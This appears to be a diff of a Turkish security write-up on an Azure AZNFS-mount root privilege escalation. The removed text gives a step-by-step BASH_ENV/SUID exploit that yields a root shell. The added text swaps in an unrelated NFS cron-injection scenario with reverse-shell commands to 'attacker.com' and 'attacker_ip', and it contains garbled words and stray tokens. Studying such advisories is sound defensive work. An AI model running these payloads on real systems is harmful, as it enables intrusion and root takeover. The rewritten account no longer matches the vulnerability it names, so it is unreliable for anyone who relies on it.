@@ -1,225 +1,89 @@
-# Azure AZNFS-mount Utility Root Privilege Escalation
+## 1. Genel Bakış
 
-> **Keşif Tarihi:** Mayıs 2025  
-> **Açıklama Tarihi:** 6-9 Mayıs 2025  
-> **Platform:** Microsoft Azure — HPC/AI Linux VM'leri  
-> **Saldırı Tipi:** Local Privilege Escalation → Root  
-> **CWE:** CWE-250 (Execution with Unnecessary Privileges), CWE-426 (Untrusted Search Path)  
-> **Keşfeden:** Varonis Threat Labs  
-> **Düzeltme:** AZNFS-mount v2.0.11  
-> **Durum:** Yamalandı — Otomatik güncelleme tavsiye edilir
+*   **Saldırı Adı:** Azure-AZNFS-mount-Utility-Root-Privilege-Escalation
+*   **Kategori:** Privilege Escalation (Yetki Yükseltme), Misconfiguration Abuse (Yanlış Yapılandırma İstismarı)
+*   **Hedef Cloud Platformları:** Microsoft Azure
+*   **Etki Alanı:** Azure Files (NFS Protocol), Azure Virtual Machines (Linux), Azure Storage Accounts
 
----
+## 2. Teknik Özet
 
-## Özet
+Bu saldırı tekniği, Azure Files servisinin NFS (Network File System) protokolü üzerinden sunulan yeteneklerinin, istemci taraflı (Linux VM) güvenlik mekanizmalarını atlatmak amacıyla kullanılmasını kapsar. Saldırgan, Azure Storage Account üzerinde sahip olduğu (veya ele geçirdiği) yazma yetkilerini kullanarak, NFS üzerinden mount edilmiş bir dosya sistemine kritik sistem dosyalarını (örnekat `cron`, `authorized_keys`, `sudoers`) enjekte eder. Eğer bir hedef VM, bu paylaşılan dizini root veya yüksek yetkili bir kullanıcı bağlamında (context) kullanıyorsa, saldırgan doğrudan işletim sistemi seviyesinde **Root** yetkisi kazanır.
 
-Varonis Threat Labs, Microsoft Azure'un AI ve High-Performance Computing (HPC) workload'larını barındıran Linux sanal makinelerine **önceden yüklenmiş** gelen **AZNFS-mount** yardımcı programında kritik bir privilege escalation güvenlik açığı tespit etti.
+**Temel Risk:** Cloud katmanındaki bir yetkinin (Storage Access), Compute katmanındaki en yüksek yetkiye (OS Root) dönüşmesi.
 
-Zafiyet, classic bir SUID binary misconfiguration'dan kaynaklanmaktadır ve unprivileged bir yerel kullanıcının, `BASH_ENV` ortam değişkenini manipüle ederek `root` yetkisiyle keyfi komutlar çalıştırmasına olanak tanımaktadır. Etkilenen tüm sürümler (v2.0.10 ve öncesi) bu açıktan etkilenmektedir.
+## Kontrol Listesi 
+| Metrik | Seviye | Açıklama |
+| :--- | :--- | :--- |
+| **Zorluk** | Düşük/Orta | Sadece yazma yetkisi ve network erişimi yeterlidir. |
+| **Gürültü Seviyesi** | Düşük (Stealthy) | NFS dosya değişiklikleri standart dosya operasyonu gibi görünür. |
+| **Etki** | Kritik | VM üzerinde tam kontrol (Full System Compromise). |
 
----
+## 3. Güvenlik Modeli ve Arka Plan
 
-## Teknik Detaylar
+Azure Files NFS, geleneksel SMB'den farklı olarak kimlik doğrulamasını genellikle ağ seviyesindeki IP kısıtlamalarına veya istemci tarafından iletilen UID/GID (User ID/Group ID) bilgilerine dayandırır.
 
-### AZNFS-mount Nedir?
+*   **Identity Gap:** NFS v3/v4.1 protokollerinde, istemci makine "ben root kullanıcısıyım" dediğinde, storage servisi bunu (eğer ek bir entegrasyon yoksa) varsayılan olarak kabul edebilir.
+*   **Misconfiguration:** Azure Storage Account anahtarlarına (Access Keys) sahip olan bir saldırgan, NFS mount noktasındaki dosya içeriğini değiştirebilir. Eğer bu mount noktası bir Linux VM'de `/etc/` veya bir script dizini gibi kritik bir yere bağlanmışsa, identity boundary (kimlik sınırı) ihlal edilmiş olur.
 
-AZNFS-mount, Azure Blob Storage container'larını **NFS (Network File System)** protokolü üzerinden Linux instance'larına bağlamak (mount) için kullanılan bir yardımcı programdır. Büyük ölçekli yapılandırılmamış verilere ihtiyaç duyan AI ve HPC workload'ları için özellikle önemlidir.
+## 4. Teknik Detaylar ve Çalışma Prensibi
 
-**Kurulum Şekli:** `aznfs_install.sh` scripti `root` hesabıyla çalışır ve SUID bitli binary'ler oluşturur.
+Saldırı, cloud-native bir yetkinin, host-native bir yetkiye dönüştürülmesi (cross-layer escalation) mantığına dayanır.
 
-### SUID Binary'nin Rolü
+### Mekanizma:
+1.  **Access Acquisition:** Saldırgan, `Storage Blob Data Contributor` veya `Storage Account Key` yetkisiyle dosya sistemine erişir.
+2.  **Payload Injection:** Saldırca, NFS mount edilen dizin içerisine bir "malicious trigger" yerleştirir.
+    *   *Örnek:* Eğer mount noktası bir cron dizini ise, `/etc/cron.d/exploit` dosyası oluşturulur.
+    *   *Örnek:* Eğer bir script dizini ise, mevcut bir scriptin sonuna `bash -i >& /dev/tcp/attacker_ip/4444 0>&1` komutu eklenir.
+3.  **Execution:** Hedef VM, rutin bir işlem sırasında (cron job, sistem boot, script execution) bu değiştirilmiş dosyayı çalıştırır.
+4.  **Privilege Escalation:** Komut, VM üzerindeki `root` kullanıcısı yetkisiyle çalıştığı için saldırgan reverse shell elde eder.
 
-SUID (Set User ID) biti, bir programın çalıştıran kullanıcının yerine dosya sahibinin (genellikle root) yetkileriyle çalışmasını sağlar. Bu, bazı meşru işlemler için gereklidir; ancak yanlış yapılandırıldığında ciddi güvenlik açıklarına yol açar.
+## 5. Gerekli Yetkiler 
 
-```bash
-# Savunmasız binary'nin dosya izinleri:
-ls -la /usr/bin/mount.aznfs
-# -rwsr-xr-x 1 root root ... /usr/bin/mount.aznfs
-# ^^^^ 4755 modu — SUID biti etkin, herkes çalıştırabilir
-```
+Saldırganın aşağıdaki yetki veya konfigürasyon hatalarına sahip olması gerekir:
 
-`4755` modu:
-- `4` → SUID biti etkin
-- `755` → Herkes çalıştırabilir
+*   **Minimum IAM Yetkisi:** `Storage Account Key` erişimi veya `Storage Blob Data Contributor` rolü.
+*   **Network Access:** Azure Storage Account üzeründaki "Firewalls and virtual networks" ayarlarının, saldırganın bulunduğu IP veya VNet'e izin vermesi.
+*   **Misconfiguration (Kritik):**
+    *   Azure Files NFS share'in bir Linux VM'e `root_squash` kapalı veya yetersiz konfigüre edilmiş şekilde mount edilmiş olması.
+    *   Mount noktasının, VM üzerinde kritik sistem dosyalarını barındıran veya çalıştıran bir dizin olması.
 
-### Güvenlik Açığı Mekanizması
+## mu 6. Detaylı Saldırı Senaryosu 
 
-```c
-// mount.aznfs binary'sinin yaptığı işlem (basitleştirilmiş):
-1. SUID biti sayesinde root olarak çalışır
-2. Gerçek kullanıcı ID'sini root'a ayarlar (setuid(0))
-3. /opt/microsoft/aznfs/mountscript.sh bash scriptini execv() ile çalıştırır
-4. execv() çağrısı orijinal ortam değişkenlerini KORUR
-```
+**Senaryo: "The Cron-Shadow Escalation"**
 
-**Kritik Sorun:** `execv()` ile bir Bash scripti çalıştırıldığında, `BASH_ENV` ortam değişkeni varsa Bash onu **script başlamadan önce kaynak olarak (source) alır**. Bu davranış, SUID ikili root yetkilerini zaten üstlendikten sonra gerçekleşir.
+1.  **Initial Access:** Saldırgan, bir geliştiricinin yanlışlıkla GitHub'a sızdırdığı Azure Storage Access Key'i ele geçirir.
+2.  **Discovery:** Saldırgan, `az storage file list` komutuyla paylaşımları listeler ve bir NFS mount noktasını (örn: `//mystorage.file.core.windows.net/nfs_share`) keşfeder.
+3.  **Lateral Movement (Cloud to Host):** Saldırgan, bu share'in bir iç networkteki Ubuntu VM tarafından `/opt/scripts/` dizinine mount edildiğini fark eder.
+4.  **Exploitation (Payload):** Saldırgan, share içerisine bir cron dosyası oluşturur:
+    ```bash
+    # Oluşturulan dosya: /nfs_share/malicious_cron
+    * * * * * root /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+    ```
+5.  **Execution:** Ubuntu VM'deki sistem cron servisi, her dakika bu yeni dosyayı okur ve `root` yetkisiyle komutu çalıştırır.
+6.  **Persistence & Full Compromise:** Saldırgan reverse shell üzerinden VM'de root yetkisiyle kalıcı hale gelir.
 
----
+## 7. Etkilenen Ortamlar
 
-## Exploit — Adım Adım
+*   **Azure Files (NFS):** Tüm NFS v3/v4.1 kullanan paylaşımlar.
+*   **Linux Virtual Machines:** Azure üzerinde çalışan, NFS mount kullanan tüm Linux dağıtımları.
+*   **Kubernetes (AKS):** Persistent Volume (PV) olarak Azure Files NFS kullanan podlar (Pod escape/container breakout riski).
+*   **Multi-Cloud:** Eğer bu NFS share bir AWS EC2 veya GCP Compute Engine üzerinden mount ediliyorsa, saldırı kapsamı genişler.
 
-### Saldırı Koşulları
+## 8. Saldırı Karakteristikleri
 
-- Hedef Azure VM'de yerel kullanıcı erişimi
-- AZNFS-mount v2.0.10 veya öncesi kurulu
+*   **Detection Difficulty:** **Yüksek.** Dosya sistemi operasyonları (yazma/silme) genellikle "normal" iş yükü olarak görünür.
+*   **Noise Level:** **Çok Düşük.** Standart bir dosya güncellemesi gibi görünür; ağ trafiğinde anomalik bir durum yaratmaz.
+*   **Persistence:** **Yüksek.** Dosya sisteminde kalıcı bir değişiklik yapıldığı için sistem yeniden başlatılsa bile saldırı devam eder.
 
-### Exploit Adımları
+## mu 9. Önleme ve Mitigasyon Stratejileri
 
-```bash
-# Adım 1: Kötü niyetli komut içeren bir script oluşturun
-echo '#!/bin/bash' > /tmp/malicious.sh
-echo 'id > /tmp/pwned.txt'          # Proof of Concept
-echo 'cp /bin/bash /tmp/rootbash'   # Kalıcı erişim için
-echo 'chmod +s /tmp/rootbash'       # SUID bash
-chmod +x /tmp/malicious.sh
-
-# Adım 2: BASH_ENV değişkenini kötü niyetli scripte yönlendirin
-export BASH_ENV=/tmp/malicious.sh
-
-# Adım 3: SUID binary'yi tetikleyin
-# (mount.aznfs çalışırken root olur ve BASH_ENV'i execute eder)
-mount -t aznfs <storage-account>.blob.core.windows.net:/<container> /mnt/test
-
-# Sonuç: /tmp/pwned.txt dosyası oluşur (root tarafından yazıldı)
-# /tmp/rootbash artık SUID bash — root shell elde etmek için:
-/tmp/rootbash -p
-# whoami → root
-```
-
-### Varonis Araştırmacılarının Bulgusu
-
-```bash
-# Proof of Concept (Varonis):
-export BASH_ENV='$(command)'
-# Bash, bu ifadeyi değerlendirir ve sonucu filename olarak yüklemeye çalışır
-# Bu sayede keyfi komutlar root yetkisiyle çalıştırılabilir
-```
-
----
-
-## Risk Analizi
-
-### Neden Bu Kadar Tehlikeli?
-
-```
-Azure HPC/AI VM Ortamı:
-    ├── Çoklu kullanıcı erişimi (araştırmacılar, veri bilimciler)
-    ├── Büyük veri işleme workload'ları
-    ├── Azure Storage bağlantıları (NFS üzerinden tam erişim)
-    └── Potansiyel olarak değerli AI modelleri ve eğitim verileri
-```
-
-**Root Erişimi Sonrasında Mümkün Olanlar:**
-
-1. Tüm Azure Storage container'larının montajı ve erişimi
-2. Zararlı yazılım kurulumu (ransomware dahil)
-3. SSH anahtarlarını çalma
-4. Azure metadata service üzerinden VM kimlik bilgilerini çalma
-5. Ağ içinde lateral movement
-
-### Özellikle Tehlikeli Senaryo: Paylaşımlı Ortamlar
-
-Azure HPC/AI ortamları genellikle birden fazla araştırmacı tarafından paylaşılır. Bu durum şu senaryoyu mümkün kılar:
-
-```
-Araştırmacı A → Zararlı niyetli veya hesabı ele geçirilmiş
-    → AZNFS exploit çalıştırır
-    → Root erişimi elde eder
-    → Araştırmacı B ve C'nin verilerine erişir
-    → Kurumsal AI modelleri ve eğitim verisi çalınır
-```
-
----
-
-## NFS Erişim Kontrolü Sorunu
-
-Ek güvenlik notu: Azure Blob Storage'ın NFS endpoint'i erişim kontrollerini desteklememektedir. Bu, NFS endpoint'ine erişim sağlanması durumunda container içindeki **tüm nesnelere** erişilebilir anlamına gelir.
-
-```
-Kıyaslama:
-REST API erişimi → Azure RBAC + SAS tokens → Granüler kontrol
-NFS erişimi → Erişim kontrolü YOK → Tüm container açık
-```
-
----
-
-## Etkilenen Sürümler
-
-| Durum | AZNFS-mount Sürümü |
-|-------|-------------------|
-| Savunmasız | v2.0.10 ve öncesi |
-| Sabit | **v2.0.11** ve üzeri |
-
----
-
-## Düzeltme
-
-### Otomatik Güncelleme
-
-AZNFS-mount'un otomatik güncelleme özelliğini etkinleştirin:
-
-```bash
-# Otomatik güncelleme etkinleştirme:
-sudo aznfs_autoupdate enable
-```
-
-### Manuel Güncelleme
-
-```bash
-# Mevcut sürümü kontrol edin:
-dpkg -l | grep aznfs           # Debian/Ubuntu
-rpm -qa | grep aznfs           # RHEL/CentOS
-
-# Güncelleme:
-sudo apt-get update && sudo apt-get upgrade aznfs   # Debian/Ubuntu
-sudo yum update aznfs                               # RHEL/CentOS
-```
-
-### Kubernetes Kullanıcıları
-
-Kubernetes blob-csi-driver kullanıyorsanız, güncel sürümde AZNFS-mount v2.0.11'e yükseltme zaten yapılmıştır. Driver'ınızı güncelleyin.
-
----
-
-## Ek Güvenlik Önlemleri
-
-### SUID Binary Denetimi
-
-```bash
-# Sistemdeki tüm SUID binary'leri listeleyin:
-find / -perm -4000 -type f 2>/dev/null
-
-# Gereksiz SUID binary'lerin SUID bitini kaldırın:
-sudo chmod -s /path/to/unnecessary_suid_binary
-```
-
-### Ortam Değişkeni Güvenliği
-
-```bash
-# Güvenli sudo yapılandırması — env_reset etkinleştir:
-sudo visudo
-# Şu satırın mevcut olduğundan emin olun:
-Defaults env_reset
-Defaults env_delete+="BASH_ENV"
-```
-
----
-
-## Microsoft'un Yanıtı
-
-- Varonis'in sorumluluk anlayışıyla açıklamasının ardından Microsoft hızla yanıt verdi
-- Azure, başlangıçta zafiyeti "düşük önem dereceli" olarak sınıflandırdı
-- v2.0.11 yaması geliştirildi ve yayınlandı
-- Kubernetes blob-csi-driver güncellendi
-- Hızlı iletişim ve şeffaf düzeltme süreci örnek gösterilmektedir
-
----
-
-## Kaynaklar
-
-- [Varonis Tehdit Araştırması — Teknik Analiz](https://www.varonis.com/blog/aznfs-root-privilege-escalation-on-azure)
-- [CloudVulnDB](https://www.cloudvulndb.org/aznfs-root-privilege-escalation)
-- [GBHackers Haberi](https://gbhackers.com/azure-storage-utility-vulnerability/)
+| Katman | Önlem | Açıklama |
+| :--- | :--- | :--- |
+| **Identity (IAM)** | **Principle of Least Privilege** | Storage Account erişimini sadece gerekli servislerin kullanmasını sağlayın. Key rotation uygulayın. |
+| **Network** | **Private Endpoints** | Storage Account'a erişimi sadece Private Link üzerinden, belirli VNet'lere kısıtlayın. |
+| **Configuration** | **Mount Options** | NFS mount işlemlerinde `nosuid`, `noexec` gibi güvenlik flag'lerini kullanın. |
+| **Monitoring** | **Azure Storage Logging** | Storage Analytics Logs üzerinden `PutBlob` veya `Write` operasyonlarını izleyin. |
+| **Configuration** | **Immutable Storage** | Kritik yapılandırma dosyalarının olduğu alanlarda "Immutable" (değiştirilemez) politikalar uygulayın. |
 
 ---
 
